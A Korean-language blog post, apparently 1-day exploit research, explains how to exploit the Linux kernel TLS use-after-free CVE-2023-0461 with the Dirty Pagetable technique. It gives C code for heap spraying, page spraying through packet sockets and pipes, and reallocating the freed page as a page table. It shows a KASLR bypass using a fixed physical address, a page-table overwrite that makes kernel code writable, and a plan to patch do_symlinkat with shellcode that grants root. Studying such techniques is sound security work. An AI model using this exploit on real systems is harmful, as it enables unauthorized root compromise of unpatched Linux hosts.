## Overview
이 글에서는 최근 널리 사용되는 공격 기법을 실제 취약점에 적용하여 권한 상승을 달성하는 과정을 다룹니다. 특히, `tls_context` 객체의 UAF 취약점을 이용한 Dirty Pagetable 공격을 통해 이 기법을 자세히 살펴보겠습니다.

이 글에서는 취약점에 대한 구체적인 내용보다는 악용 기법에 초점을 맞춥니다. 취약점에 대한 심층 분석 및 PoC는 [이전 글](https://gimmia.github.io/posts/poc/)에서 다루고 있으며, 전체 익스플로잇 코드는 제 [깃허브](https://github.com/gimmia/1-day-study/blob/main/linux_kernel/CVE/2023/0461/exploit/exp.c)에서 볼 수 있습니다.

## What's vulnerable?
2023년, [0xdevil](https://syst3mfailure.io/)님과 [koczkatamas](https://github.com/koczkatamas)님은 CONFIG_TLS가 활성화된 커널에서 사용자가 TCP 소켓을 연결하고 TLS 컨텍스트를 설치한 소켓을 닫을 때 `inet_connection_sock` 구조체의 `icsk_ulp_data`가 지워지지 않는 use-after-free 버그를 발견했습니다. `icsk_ulp_data`는 `tls_context` 객체에 대한 포인터입니다. 이 취약점은 복제된 소켓이 부모의 `icsk_ulp_data`를 공유하기 때문에 double-free 및 use-after-free로 쉽게 이어질 수 있습니다. 해당 버그는 4.13-rc1 - 6.2-rc3 커널 버전의 net/tls.ko 모듈에서 영향을 받습니다.

## Notes on Dirty Pagetable
커널은 페이지 테이블(PTE)을 할당할 때 버디 할당자에게 사용 가능한 페이지를 요청합니다. 할당자가 ZONE NORMAL의 `free_area[ORDER 0]->free_list[UNMOVABLE]`에서 페이지 하나를 반환해주면 커널은 여기에 **PFN**과 **flags**를 기록하게 됩니다. 

**Dirty pagetable** 기법은 해제되었지만 아직 회수되지 않은 dangling page를 악용하여 PTE를 손상시킵니다. 이 공격 기법의 가장 큰 매력은 PTE에 기록된 PFN과 flags를 수정함으로써 유저 공간에서 커널 메모리의 코드 영역을 쉘코드로 덮어쓸 수 있다는 것입니다. 

이 익스플로잇은 객체에 대한 use-after-free가 어떻게 dangling page를 생성하고 dirty pagetable로 이어질 수 있는지 보여줍니다.

### Step 1. kmalloc-512 spray for flushing per-CPU page list
`tls_context` 객체는 kmalloc-512 슬랩 캐시에서 할당됩니다. 이 객체가 포함된 SLUB 페이지는 migration type이 **UNMOVABLE**, 그리고 **order-1** 크기를 가집니다. 하지만 앞서 언급했던 것처럼 커널은 order-0인 페이지를 PTE로 할당받기 때문에 SLUB 페이지를 order-0 크기로 이동시켜야 합니다. 

먼저 취약한 객체가 포함된 SLUB 페이지를 kmalloc-512 슬랩 캐시에서 해제시키기 위해 `msg_msg` 객체들을 spray 합니다. 또 다른 spray 객체인 `user_key_payload`는 kmalloc-512에 대한 노이즈로 인해 고려되지 않았습니다.
```c
tls_p = setup_socket(1234);

setup_msg('A');
for (int i = 0; i < MSG_SPRAY; i++) 
{
    msg_alloc(i);
}

tls_alloc(tls_p);
tls_c = tls_copy(tls_p, 5678); 
tls_g = tls_copy(tls_c, 9100);
close(tls_p);

setup_msg('B');
for (int i = MSG_SPRAY; i < K512_VICTIM_CHUNKS; i++) 
{
    msg_alloc(i);
}
```
소켓을 `close()`하여 `tls_context`를 해제할 때는 `kfree_rcu()`를 고려하여 6초를 대기합니다. 이제 `msg_msg` 객체들을 모두 해제하면 per-cpu partial list와 node partial list의 수용 한계를 넘게 되고, empty 상태인 SLUB 페이지들이 캐시에서 해제됩니다.

이때 처음 생성한 `tls_p` 소켓을 복제한 두 소켓을 모두 `close()`하는 이유는 Step 3에서 자세히 설명할 것입니다.
```c
sleep(6);
close(tls_c);
close(tls_g);

for (int i = K512_VICTIM_CHUNKS - 1; i >= 0 ; i--) 
{
    msg_free(i);
}
```
kmalloc-512 캐시에서 해제된 SLUB 페이지들은 **per-CPU page list**로 반환됩니다. 이 PCP list는 각 CPU별로 존재하는 페이지 캐시로써 order-3 이하의 페이지 요청을 빠르게 처리하는 것이 주된 목적이기 때문에 할당자는 요청을 받으면 제일 먼저 PCP list에서 페이지를 찾고 할당해줍니다.

PCP list는 `per_cpu_pages`로 표현되며, 해제된 페이지들은 `lists[]` 배열에 저장된 여러 목록으로 구성됩니다. 사용할 수 있는 페이지가 모두 소진되었을 때는 `batch` 단위로 버디 할당자에서 한 번에 가져옵니다. 반대로 해제된 페이지의 개수를 기록하는 `count`가 `high`를 초과하여 페이지를 버디 할당자로 돌려보낼 때도 `batch` 단위로 반환합니다.
```c
struct per_cpu_pages {
	  spinlock_t lock;	  /* Protects lists field */
	  int count;		      /* number of pages in the list */
	  int high;		        /* high watermark, emptying needed */
	  int batch;		      /* chunk size for buddy add/remove */
    // ...
	  struct list_head lists[NR_PCP_LISTS];
}
```
{: file="include/linux/mmzone.h" }
`lists[]`는 최대 [NR_PCP_LISTS](https://elixir.bootlin.com/linux/v6.1/source/include/linux/mmzone.h#L566)만큼의 리스트를 포함할 수 있으며, `CONFIG_TRANSPARENT_HUGEPAGE` 기능이 비활성화 상태일 경우 12개의 리스트를 가집니다. 이는 각 order의 페이지들을 3가지의 migration type(`UNMOVABLE`, `MOVABLE`, `RECLAIMABLE`)으로 관리하기 위함입니다. kmalloc-512 SLUB 페이지는 해제될 때 `lists[3]`에 연결되며, 이는 order-1 UNMOVABLE에 해당합니다. 
```shell
pwndbg> p/x *(struct per_cpu_pages *)0xffff88813bc2e740
$1 = {
  # ...
  count = 0x104,
  high = 0x16c,
  batch = 0x3f,
  free_factor = 0x0,
  expire = 0x0,
  lists = {
    {
      next = 0xffffea000400c8c8,  # order-0 | UNMOVABLE
      prev = 0xffffea00040970c8
    }, {
      next = 0xffff88813bc2e768,  # order-0 | MOVABLE
      prev = 0xffff88813bc2e768
    }, {
      next = 0xffffea0004013688,  # order-0 | RECLAIMABLE
      prev = 0xffffea00040135c8
    }, {
      next = 0xffff88813bc2e788,  # order-1 | UNMOVABLE
      prev = 0xffff88813bc2e788
    },
    # ...
    }
}
```
그럼 이제 페이지 스프레이를 통해서 해제된 취약한 SLUB 페이지를 PTE로 할당할 수 있을까요?
아쉽게도 PCP list는 버디 할당자와 다르게 특정 크기의 페이지가 모두 소진되었을 때 PCP list 내의 다른 order나 migration type에서 가져오지 않고 버디 할당자를 이용합니다.

그렇기 때문에 취약한 페이지를 PCP list에서 버디 할당자로 flush하고, 페이지 스프레이를 통해 `pcp->lists[0]`에 재배치하는 과정이 필요합니다. 이를 거치면 바로소 취약한 페이지를 PTE로 재할당 할 수 있습니다.

다음 매크로 변수들은 `msg_msg` 객체를 할당하고 해제할 때 취약한 페이지를 partial list, PCP list에서 버디 할당자로 보내버리기에 충분한 양의 객체를 제공합니다.
```c
#define OBJS_PER_SLAB_512   16
#define CPU_PARTIAL_512     52
#define K512_VICTIM_CHUNKS  (OBJS_PER_SLAB_512 * (CPU_PARTIAL_512 + 1) * 4)

#define HEADER_SIZE     48
#define MSG_DATA_SIZE   (512 - HEADER_SIZE)
#define MSG_SPRAY       (K512_VICTIM_CHUNKS / 2)
```

### Step 2. page spray via packet sockets
우리가 취약한 페이지를 PTE로 할당하고 제대로 공격에 활용하기 위해서는 페이지에 대한 read/write primitive를 얻어야 합니다. 이는 커널 메모리를 유저 공간에 매핑해주고 심지어 언제든지 원하는 값을 읽거나 쓸 수 있는 기능을 제공하는 함수를 사용하면 더욱 쉽게 달성할 수 있습니다. 그런데 이런 편리한 경우가 실제로 존재할까요?

2017년에 게시된 [Project Zero](https://projectzero.google/2017/05/exploiting-linux-kernel-via-packet.html)의 문서에서는 페이지 할당 기법을 기반으로 한 아주 좋은 방법을 알려주고 있습니다. [packet_set_ring()](https://elixir.bootlin.com/linux/v6.1/source/net/packet/af_packet.c#L4360)과 [packet_mmap()](https://elixir.bootlin.com/linux/v6.1/source/net/packet/af_packet.c#L4527) 코드를 함께 보면 소켓의 패킷 버전과 옵션을 각각 `TPACKET_V3`, `PACKET_RX_RING`으로 설정했을 때, `alloc_pg_vec()`에서 할당한 페이지로 `rb->pg_vec`를 초기화하고 `packet_mmap()`이 호출될 때 `vm_insert_page()`에서 해당 페이지와 유저 메모리를 매핑합니다.

다만, 이 기능은 파격적인 만큼 사용자의 권한이 낮으면 루트 네임스페이스에서 해당 기능을 사용할 수 없습니다. 하지만 대부분의 Linux 시스템에서는 `unshare()`를 사용해 새로운 사용자 지정 네임스페이스를 만들 수 있기 때문에 문제가 되지 않습니다.
```c
int alloc_packet_ring_buffer(int i, int block_size, int frame_size, int blocknum)
{
    struct tpacket_req3 req;
    int v = TPACKET_V3;

    int rv = setsockopt(socketfds[i], SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) 
    {
        perror("[x] setsockopt(PACKET_VERSION)");
        exit(1);
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = blocknum;
    req.tp_frame_nr = (block_size * blocknum) / frame_size;
    req.tp_retire_blk_tov = 60;

    rv = setsockopt(socketfds[i], SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	  if (rv < 0) 
    {
		    perror("[x] setsockopt(PACKET_RX_RING)");
		    exit(1);
	  }
}

void mmap_packet_ring_buffer(int i, int size, char chr)
{
    void *vma = mmap(NULL, size, PROT_READ|PROT_WRITE, 
                    MAP_SHARED|MAP_LOCKED, socketfds[i], 0);
                    
    if (vma == MAP_FAILED)
    {
        perror("[x] mmap(socketfd)");
        exit(1);
    }

    memset(vma, chr, size);
    pbuf_pages[i] = vma;
}
```
버디 할당자로 flush된 취약한 페이지를 `pcp->lists[0]`로 가져오기 위해 `setsockopt()`으로만 스프레이를 진행했으나, fd가 먼저 소진되어버리는 바람에 `pipe()`를 함께 사용하기로 했습니다.

`pipe()`는 `write()`를 통해 간단히 페이지를 할당받을 수 있지만, 동일한 페이지에 대해 수정하는 기능이 없어서 안정적인 write primitive를 얻을 수 없습니다. 하지만 기본적으로 pipe 당 최대 16개의 페이지 버퍼를 할당할 수 있다는 점을 활용하여 적은 수의 fd로 취약한 페이지를 `pcp->lists[0]`를 거쳐 `pipe_buffer`로 할당할 수 있었습니다.
```c
memset(spray_buf, 'C', PAGE_SIZE);
for (int i = 0; i < NUM_PIPES; i++)
{
    for (int j = 0; j < PAGES_PER_PIPE; j++)
    {
        spray_pages(i);
    }
}
```
이제 취약한 페이지가 해제되면 `pcp->lists[0]`으로 반환됩니다. 그리고 이것을 `packet_ring_buffer`로 재할당하고 유저 메모리와 `mmap()`하면 dirty pagetable을 위한 마지막 준비만이 남게 됩니다.
```c
for (int i = 0; i < PBUF_SPRAY; i += 2)
{
    if (idx < NUM_PIPES) release_pipes(idx++);
    alloc_packet_ring_buffer(i, PAGE_SIZE, PAGE_SIZE, 1);
    alloc_packet_ring_buffer(i + 1, PAGE_SIZE, PAGE_SIZE, 1);
}

for (int i = 0; i < PBUF_SPRAY; i++)
{
    mmap_packet_ring_buffer(i, PAGE_SIZE, 'D');
}
```

### Step 3. page spray via PTE
page는 참조 카운터가 0이 되어야 해제되고 다시 할당될 수 있습니다. 이러한 기본적인 내용을 다시 짚고 넘어가는 이유는 Step 1에서 언급했던 두 소켓을 모두 `close()`한 것과 관련이 있습니다.

Step 2에서 `packet_ring_buffer`로 할당된 페이지는 `packet_mmap()`에서 유저 메모리와 매핑되면서 `page->_refcount`가 2로 증가하게 됩니다. 그리고 `kfree()`는 해제하려는 객체가 더이상 슬랩으로 관리되지 않으면 `free_large_kmalloc()`에서 `__free_pages()` 함수를 호출하고 객체가 포함된 페이지를 해제합니다. 
```c
void kfree(const void *object)
{
    // ...
    folio = virt_to_folio(object);
    if (unlikely(!folio_test_slab(folio))) {
        free_large_kmalloc(folio, (void *)object);
        return;
    }
    // ...
}

void free_large_kmalloc(struct folio *folio, void *object)
{
    unsigned int order = folio_order(folio);
    // ...
    mod_lruvec_page_state(folio_page(folio, 0), NR_SLAB_UNRECLAIMABLE_B,
    		                -(PAGE_SIZE << order));
    __free_pages(folio_page(folio, 0), order);
}
```
{: file="mm/slab_common.c" }
6초가 지나면 `kfree_rcu()`에 의해 두 소켓이 `icsk_ulp_data` 포인터로 공유하는 `tls_context`를 포함한 페이지가 두 번 해제되어 `page->_refcount`가 2에서 0으로 감소하게 되고, 유저와 매핑된 `packet_ring_buffer`가 원격으로 해제되어 `pcp->lists[0]`로 들어갑니다.

이제 사전에 `mmap()`으로 할당한 다수의 vma에 page fault를 발생시키면 페이지가 MOVABLE에서 할당되고, 이를 참조하기 위한 여러 페이지 테이블이 `pcp->lists[0]`에서 할당되면서 취약한 페이지가 PTE로 재할당됩니다. 이때 `packet_mmap()`으로 유저와 매핑된 페이지의 첫 8byte가 항상 동일한 flag로 초기화되는 특징을 활용하면 재할당된 페이지를 간단히 식별할 수 있습니다.
```c
sleep(6);

for (int i = 0; i < PTE_SPRAY; i++) 
{
    for (int j = 0; j < 8; j++) 
    {
        *((char *)page_spray[i] + j * 0x1000) = 'E';
    }
}

for (int i = 0; i < PBUF_SPRAY; i++)
{
    if (scan_page(i) > 0)
    {
        pte_page = (uint64_t *)pbuf_pages[i];
        break;
    }
}
```

### Step 4. exploiting via dirty pagetable
PTE에 저장된 entry는 **PFN**과 **flags**로 이루어져 있습니다. flag 하위 12비트 중 Bit 1은 페이지에 대한 **Read/Write** 권한을 나타내며, 공격자는 이를 `_text` 영역에서 활성화하여 매핑된 유저 메모리를 통해 특정 커널 코드를 마음대로 수정할 수 있습니다.

하지만 덮어쓸 커널 함수의 물리 주소를 찾으려면 `_text`의 물리적 기본 주소가 필요합니다. 우리는 **KASLR**이 활성화된 커널에서 공격을 진행할 것이기에 이를 우회해야 합니다.

이 단계에서는 [ptr-yudai](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606)님의 블로그에서 찾은 `0x800000000009c067` 주소를 활용할 수 있습니다. 

다음 주소 범위에는 커널 부트 타임에 생성된 여러 페이지 테이블이 존재하며, 내부에 커널 포인터 leak을 유발하는 물리 주소를 담고 있습니다.
![fixed page table](/assets/images/always_fixed_physical_address.png)

`0x9c000`는 PGD로써 내부에 PUD 주소를 담고 있습니다. 이는 커널의 물리적 기본 주소를 알아내는 데 유용합니다.
![page table working](/assets/images/0x9c000_page_global_directory.png)

이제 매핑된 유저 메모리를 통해 PTE의 entry 값 중 하나를 덮어쓰면 유저 공간에 매핑된 페이지 중에서 참조가 달라진 것이 존재할 것이고, 그 안에서 우리가 목표로 했던 값을 읽을 수 있습니다.
```c
uint64_t *page_table_entry = (uint64_t *)((uint8_t *)pte_page + 0x38);
*page_table_entry = 0x800000000009c067;

for (int i = 0; i < PTE_SPRAY; i++) 
{
    for (int j = 0; j < 8; j++) 
    {
        if (*((char *)page_spray[i] + j * 0x1000) != 'E')
        {
            overlap_page = (char *)page_spray[i] + j * 0x1000;
            break;
        }
    }
}
```
페이지를 식별하고 읽은 값에서 특정 오프셋(커널 버전에 따라 다를 수 있음)을 빼면 커널의 물리적 기본 주소를 구할 수 있습니다. 계산된 주소는 커널의 `_text` 심볼에 해당하며, 적절한 오프셋을 더해 원하는 커널 주소에 접근할 수 있습니다. 이때 페이지의 **Read/Write** flag를 활성화하여 커널 코드를 수정할 수 있도록 설정합니다.
```c
uint64_t phys_base = (*(uint64_t *)overlap_page & ~0xfffULL) - 0x2204000;
size_t phys_func = phys_base + 0x241380;
*page_table_entry = (phys_func & ~0xfffULL) | 0x8000000000000067ULL;
```
덮어쓸 대상은 커널 내부에서 심볼릭 링크를 생성하는 기능을 수행하는 `do_symlinkat()` 함수입니다. 반드시 이 함수일 필요는 없지만, 커널 코드를 덮어쓰는 일이기 때문에 유저 공간에서 호출할 수 있으면서 커널이 자주 사용하지 않는 함수를 선택하는 것이 좋습니다. 오프셋은 다음과 같은 방법으로 구할 수 있습니다.
```shell
pwndbg> p/x (unsigned long)&do_symlinkat - (unsigned long)&_stext
$2 = 0x241380
```

### Step 5. overwriting with shellcode
해당 익스플로잇 프로세스는 `setsockopt()` 같은 권한이 필요한 작업을 수행하기 위해 `unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET)`를 실행하여 루트 네임스페이스에서 분리된 상태입니다. 그렇기 때문에 `commit_creds(&init_cred)`를 통해 `current->cred`를 root 권한으로 바꿔도 파일시스템은 여전히 격리되어 `execve("/bin/sh")`를 실행할 수 없습니다. 따라서 `current->fs`를 `init_fs`로 변경하여 루트 네임스페이스로 전환합니다.

`execve("/bin/sh")`의 경로 해석은 `current->fs->root`에 담긴 `struct path`(vfsmount + dentry)를 기준으로 시작됩니다. `init_fs`를 복제하면 루트 파일시스템의 `vfsmount`를 직접 참조하게 되므로 격리된 마운트 네임스페이스와 무관하게 `/bin/sh`에 접근할 수 있습니다.

이때 사용되는 `copy_fs_struct(&init_fs)` + `current->fs = new_fs` 조합은 `setns()` 시스템 콜에서 수행되는 동작의 일부입니다. 따라서 권한 상승을 달성하고 유저 공간으로 복귀한 이후 `setns()`를 사용하는 것으로 대체할 수 있습니다. 

참고로 `CLONE_NEWPID`로 PID 네임스페이스까지 분리된 환경이라면 `current->nsproxy`를 `init_nsproxy`로 변경해야 합니다.
